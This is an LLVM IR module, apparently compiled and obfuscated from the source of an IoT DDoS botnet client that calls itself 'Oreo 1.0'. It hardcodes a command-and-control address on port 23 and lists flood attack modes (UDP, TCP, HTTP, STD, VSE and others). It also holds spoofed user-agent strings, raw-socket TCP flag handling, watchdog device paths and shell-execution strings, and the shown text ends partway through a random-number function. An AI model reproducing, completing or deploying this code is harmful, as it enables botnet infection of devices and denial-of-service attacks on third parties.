; ModuleID = 'host/ir_sub/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = global i32 0, align 4
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"TSource Engine Query\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -978123154
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, -978123154
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 0, -1640531527
  %12 = sub i32 %10, %11
  %13 = add i32 %10, -1640531527
  %14 = add i32 %12, 495564101
  %15 = add i32 %14, -1640531527
  %16 = sub i32 %15, 495564101
  %17 = add i32 %12, -1640531527
  store i32 %16, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %18

; <label>:18:                                     ; preds = %59, %1
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  br i1 %20, label %21, label %65

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* %3, align 4
  %23 = sub i32 %22, -845581372
  %24 = sub i32 %23, 3
  %25 = add i32 %24, -845581372
  %26 = sub nsw i32 %22, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = sub i32 0, 2
  %32 = add i32 %30, %31
  %33 = sub nsw i32 %30, 2
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = xor i32 %29, -1
  %38 = and i32 %36, %37
  %39 = xor i32 %36, -1
  %40 = and i32 %29, %39
  %41 = or i32 %38, %40
  %42 = xor i32 %29, %36
  %43 = xor i32 %41, -1
  %44 = and i32 -1640531527, %43
  %45 = xor i32 -1640531527, -1
  %46 = and i32 %41, %45
  %47 = or i32 %44, %46
  %48 = xor i32 %41, -1640531527
  %49 = load i32, i32* %3, align 4
  %50 = xor i32 %47, -1
  %51 = and i32 %49, %50
  %52 = xor i32 %49, -1
  %53 = and i32 %47, %52
  %54 = or i32 %51, %53
  %55 = xor i32 %47, %49
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %57
  store i32 %54, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %21
  %60 = load i32, i32* %3, align 4
  %61 = sub i32 %60, -846663004
  %62 = add i32 %61, 1
  %63 = add i32 %62, -846663004
  %64 = add nsw i32 %60, 1
  store i32 %63, i32* %3, align 4
  br label %18

; <label>:65:                                     ; preds = %18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
